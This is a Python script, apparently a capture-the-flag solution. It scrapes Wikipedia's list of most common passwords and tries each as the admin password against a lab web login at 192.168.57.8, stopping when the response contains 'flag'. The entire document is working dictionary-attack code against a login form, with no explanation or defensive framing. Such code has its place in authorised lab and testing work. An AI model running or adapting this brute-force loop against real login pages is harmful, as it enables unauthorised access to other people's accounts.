import requests
from bs4 import BeautifulSoup

url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"

response = requests.get(url)

if response.status_code == 200:
    unique_strings = set()
    soup = BeautifulSoup(response.content, 'html.parser')
    tables = soup.find_all('table', class_='wikitable')

    for table in tables:
        caption = table.find('caption') # Optional: Keep track of caption
        rows = table.find_all('tr')
        if caption: # Optional: Check if caption exists
            for row in rows:
                tds = row.find_all('td')
                if len(tds) >= 2:
                    for td in tds[1:]:
                        actual_td = td.get_text(strip=True)
                        if actual_td not in unique_strings:
                            print(f"Actual password: {actual_td}")
                            unique_strings.add(actual_td)
                            request_url = f"http://192.168.57.8/?page=signin&username=admin&password={actual_td}&Login=Login"
                            response = requests.get(request_url)
                            if 'flag' in response.text:
                                print(f"Found 'flag' with password: {actual_td}")
                                for line in response.text.splitlines():
                                    if 'flag' in line:
                                        print("Line containing 'flag':", line)
                                exit()
